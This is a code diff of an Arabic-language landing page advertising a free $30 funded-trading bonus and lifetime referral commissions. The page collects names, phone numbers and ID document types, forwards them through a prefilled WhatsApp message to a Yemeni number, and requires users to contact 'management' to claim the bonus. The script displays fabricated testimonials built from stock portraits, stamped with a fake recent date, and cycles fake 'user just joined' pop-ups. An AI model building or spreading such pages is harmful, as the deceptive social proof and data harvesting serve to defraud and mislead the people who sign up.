@@ -17,21 +17,29 @@
         .section-title { color: var(--primary); font-size: 1.3rem; font-weight: 900; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
         
         /* قسم رابط الإحالة الثابت */
-        #persistent-ref { display: none; background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(2, 6, 23, 0.8)); border: 2px solid var(--primary); }
+        #persistent-ref { display: none; background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(2, 6, 23, 0.8)); border: 2px solid var(--primary); animation: slideUp 0.5s ease; }
         .ref-display { background: #0f172a; padding: 12px; border-radius: 10px; border: 1px dashed var(--primary); margin: 10px 0; font-family: monospace; font-size: 0.9rem; color: var(--primary); word-break: break-all; text-align: center; }
 
         .info-box { background: rgba(255,255,255,0.03); border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 4px solid var(--primary); }
+        .info-box.gold { border-right-color: var(--gold); }
         .form-group { margin-bottom: 15px; }
         input, select { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--border); background: #0f172a; color: #fff; font-family: 'Tajawal'; box-sizing: border-box; }
-        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; font-weight: 900; cursor: pointer; }
+        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; font-weight: 900; cursor: pointer; transition: 0.3s; }
+        .btn-main:hover { transform: scale(1.02); }
         
         .review-item { display: flex; gap: 15px; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--border); }
         .review-img { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--primary); object-fit: cover; }
+        .review-date { font-size: 0.7rem; color: var(--gold); display: block; }
 
         .social-btn { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px; border-radius: 12px; text-decoration: none; color: #fff; font-weight: bold; margin-bottom: 10px; font-size: 0.95rem; }
         
-        /* التنبيه الحي */
-        #live-notify { position: fixed; bottom: 20px; left: 20px; background: var(--card); padding: 12px 20px; border-radius: 50px; border: 1px solid var(--primary); display: none; z-index: 9999; font-size: 0.85rem; }
+        /* التنسيق الأنيق لقائمة الدول */
+        .iti { width: 100%; }
+        .iti__country-list { background-color: #0f172a !important; color: white !important; border: 1px solid var(--border); border-radius: 10px; text-align: left; }
+        .iti__country.iti__highlight { background-color: var(--primary) !important; }
+
+        #live-notify { position: fixed; bottom: 20px; left: 20px; background: var(--card); padding: 12px 20px; border-radius: 50px; border: 1px solid var(--primary); display: none; z-index: 9999; font-size: 0.85rem; font-weight: bold; animation: slideUp 0.5s ease-out; }
+        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
@@ -39,25 +47,32 @@
 <div class="container">
     <div style="text-align:center; padding: 20px 0;">
         <h1 style="font-weight:900; margin:0;">نظام المكافآت الذكي <span style="color:var(--primary)">V8</span></h1>
-        <p style="color:#94a3b8;">المنصة الرسمية للتداول الممول</p>
+        <p style="color:#94a3b8;">تداول برأس مالنا واربح من الإحالة</p>
     </div>
 
     <div id="persistent-ref" class="glass-card">
         <div class="section-title"><i class="fas fa-link"></i> رابط الإحالة الخاص بك</div>
-        <p style="font-size: 0.85rem;">يمكنك العودة لهذا الرابط دائماً لنشره وكسب العمولات.</p>
         <div class="ref-display" id="mainRefLink"></div>
-        <button class="btn-main" style="padding: 10px;" onclick="copyLink()">نسخ الرابط <i class="fas fa-copy"></i></button>
+        <button class="btn-main" style="padding: 10px; font-size: 0.9rem;" onclick="copyLink()">نسخ الرابط ونشره <i class="fas fa-copy"></i></button>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-gift"></i> بونص الـ 30$ المجاني</div>
+        <div class="section-title"><i class="fas fa-coins"></i> شرح بونص الـ 30$</div>
         <div class="info-box">
-            <p style="font-size: 0.9rem;">احصل على رأس مال تداول ممول بالكامل. نحن نتحمل المخاطرة وأنت تحصل على <b>50% من الأرباح</b> القابلة للسحب فوراً.</p>
+            <h4>بونص بدون إيداع</h4>
+            <p>احصل على 30$ حقيقية في حسابك للتداول. نحن نوفر السيولة وأنت تقدم الخبرة، والأرباح مناصفة!</p>
+        </div>
+    </div>
+
+    <div class="glass-card">
+        <div class="section-title" style="color:var(--gold)"><i class="fas fa-share-nodes"></i> نظام الإحالة</div>
+        <div class="info-box gold">
+            <p>اربح <b>5$ كاش</b> عن كل صديق يسجل من خلالك، بالإضافة لـ 10% من أرباح تداول فريقك مدى الحياة.</p>
         </div>
     </div>
 
     <div id="registration-section" class="glass-card">
-        <div class="section-title"><i class="fas fa-user-shield"></i> سجل لتفعيل حسابك</div>
+        <div class="section-title"><i class="fas fa-user-plus"></i> سجل بياناتك الآن</div>
         <div class="form-group">
             <input type="text" id="name" placeholder="الاسم الكامل">
         </div>
@@ -71,30 +86,21 @@
                 <option>رخصة قيادة</option>
             </select>
         </div>
-        <button class="btn-main" onclick="register()">تفعيل والحصول على الرابط ✅</button>
+        <button class="btn-main" onclick="register()">تفعيل واستلام الرابط ✅</button>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-star" style="color:var(--gold)"></i> آراء المتداولين</div>
-        <div id="reviews-list">
-            <div class="review-item">
-                <img src="https://randomuser.me/api/portraits/men/32.jpg" class="review-img">
-                <div><strong>عصام الحبيشي</strong> <p style="font-size:0.8rem; margin:0; color:#94a3b8;">"استلمت البونص وبدأت التداول، الدعم سريع جداً."</p></div>
-            </div>
-            <div class="review-item">
-                <img src="https://randomuser.me/api/portraits/women/44.jpg" class="review-img">
-                <div><strong>سارة الأحمد</strong> <p style="font-size:0.8rem; margin:0; color:#94a3b8;">"نظام الإحالة ممتاز، سحبت 50$ عمولات في يومين."</p></div>
-            </div>
-        </div>
+        <div class="section-title"><i class="fas fa-star" style="color:var(--gold)"></i> آراء المشتركين</div>
+        <div id="reviews-list"></div>
     </div>
 
     <div class="glass-card">
-        <div class="section-title"><i class="fas fa-headset"></i> حسابات التواصل الرسمية</div>
-        <p style="font-size: 0.85rem; color: var(--gold); margin-bottom: 15px;">⚠️ للحصول على بونص الـ 30$، يجب عليك التواصل مع الإدارة بعد التسجيل مباشرة.</p>
+        <div class="section-title"><i class="fas fa-headset"></i> تواصل معنا</div>
+        <p style="font-size: 0.85rem; color: var(--gold); margin-bottom: 15px;">⚠️ للحصول على بونص الـ 30$، يجب التواصل مع الإدارة بعد التسجيل.</p>
         
-        <a id="wa-btn" href="https://wa.me/967739399064" class="social-btn" style="background: #25D366;"><i class="fab fa-whatsapp"></i> تفعيل البونص عبر واتساب</a>
-        <a href="https://t.me/A_VIP_B" class="social-btn" style="background: #0088cc;"><i class="fas fa-user-tie"></i> الدعم الفني (تيليجرام)</a>
-        <a href="https://t.me/VIPA_BBOT" class="social-btn" style="background: #1e40af;"><i class="fas fa-bullhorn"></i> قناة النتائج الرسمية</a>
+        <a id="wa-btn" href="https://wa.me/967739399064" class="social-btn" style="background: #25D366;"><i class="fab fa-whatsapp"></i> تفعيل البونص (واتساب)</a>
+        <a href="https://t.me/A_VIP_B" class="social-btn" style="background: #0088cc;"><i class="fab fa-telegram-plane"></i> بوت التواصل (تيليجرام)</a>
+        <a href="https://t.me/VIPA_BBOT" class="social-btn" style="background: #1e40af;"><i class="fas fa-robot"></i> قناة النتائج والشفافية</a>
     </div>
 </div>
 
@@ -102,50 +108,78 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
+    // 1. إعداد قائمة الدول بشكل أنيق
     const iti = window.intlTelInput(document.querySelector("#phone"), {
-        separateDialCode: true, initialCountry: "auto",
+        separateDialCode: true,
+        initialCountry: "auto",
+        geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)).catch(() => s("YE")),
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
+    // 2. تحديث التقييمات تلقائياً
+    const reviews = [
+        { name: "فؤاد منصور", text: "تم تفعيل البونص وسحبت أول 20$ من الأرباح شكراً لكم.", gender: "men", id: 32 },
+        { name: "أحلام علي", text: "رابط الإحالة الخاص بي جلب لي 35$ عمولات في أسبوع واحد.", gender: "women", id: 44 },
+        { name: "صالح العولقي", text: "أفضل منصة تداول ممول جربتها، الدعم سريع جداً.", gender: "men", id: 46 }
+    ];
+
+    function renderReviews() {
+        const list = document.getElementById("reviews-list");
+        const date = new Date();
+        const dateStr = `${date.getDate() - 2}/${date.getMonth() + 1}/${date.getFullYear()}`;
+        
+        list.innerHTML = reviews.map(r => `
+            <div class="review-item">
+                <img src="https://randomuser.me/api/portraits/${r.gender}/${r.id}.jpg" class="review-img">
+                <div>
+                    <strong>${r.name}</strong> <span class="review-date">محدث: ${dateStr}</span>
+                    <p style="font-size:0.85rem; color:#94a3b8; margin:0;">${r.text}</p>
+                </div>
+            </div>
+        `).join('');
+    }
+    renderReviews();
+
+    // 3. التسجيل وتوليد الرابط والرسالة
     function register() {
-        const name = document.getElementById("name").value;
+        const name = document.getElementById("name").value.trim();
         const phone = iti.getNumber();
         const doc = document.getElementById("doc").value;
 
         if(name.length < 5 || !iti.isValidNumber()) {
-            alert("يرجى إدخال البيانات بشكل صحيح");
+            alert("يرجى إدخال اسمك الكامل ورقم هاتف صحيح");
             return;
         }
 
         const refCode = btoa(phone).substring(0, 8);
-        const link = window.location.origin + "?ref=" + refCode;
+        const myLink = window.location.origin + "?ref=" + refCode;
 
-        // إظهار قسم الرابط الثابت وإخفاء الفورم
-        document.getElementById("mainRefLink").innerText = link;
+        // إظهار رابط الإحالة الثابت
+        document.getElementById("mainRefLink").innerText = myLink;
         document.getElementById("persistent-ref").style.display = "block";
         document.getElementById("registration-section").style.display = "none";
 
-        // تحديث رابط الواتساب بالرسالة التلقائية المتضمنة للبيانات
-        const message = encodeURIComponent(`أهلاً إدارة نظام المكافآت،\n\nلقد قمت بالتسجيل في الموقع وهذه بياناتي:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n📄 الوثيقة: ${doc}\n🔗 رابط إحالتي: ${link}\n\nأريد معرفة كيف أكمل التسجيل والحصول على بونص 30$`);
-        document.getElementById("wa-btn").href = `https://wa.me/967739399064?text=${message}`;
+        // تحديث رسالة الواتساب التلقائية بالبيانات
+        const msg = encodeURIComponent(`أهلاً إدارة نظام المكافآت،\nلقد سجلت بياناتي:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n📄 الوثيقة: ${doc}\n🔗 رابط إحالتي: ${myLink}\n\nأريد معرفة كيف أكمل التسجيل والحصول على بونص 30$`);
+        document.getElementById("wa-btn").href = `https://wa.me/967739399064?text=${msg}`;
 
-        alert("تم حفظ بياناتك وتوليد رابط الإحالة! يرجى التواصل مع الإدارة الآن.");
+        alert("تم التسجيل بنجاح! انسخ رابط الإحالة وتواصل مع الإدارة.");
         window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
     function copyLink() {
         navigator.clipboard.writeText(document.getElementById("mainRefLink").innerText);
-        alert("تم نسخ الرابط بنجاح!");
+        alert("تم نسخ رابط الإحالة بنجاح!");
     }
 
-    // إشعارات حية
-    const users = ["محمد", "علي", "سلطان", "نورة", "عبدالله"];
+    // 4. إشعارات حية
+    const activeNames = ["محمد", "علي", "أحمد", "ياسين", "عبدالرحمن"];
     setInterval(() => {
         const n = document.getElementById("live-notify");
-        n.innerHTML = `<i class="fas fa-check-circle" style="color:var(--primary)"></i> سجل الآن ${users[Math.floor(Math.random()*users.length)]} وحصل على البونص!`;
+        n.innerHTML = `<i class="fas fa-check-circle" style="color:var(--primary)"></i> انضم الآن ${activeNames[Math.floor(Math.random()*activeNames.length)]} واستلم البونص!`;
         n.style.display = "block";
         setTimeout(() => n.style.display = "none", 4000);
-    }, 12000);
+    }, 15000);
 </script>
 </body>
 </html>
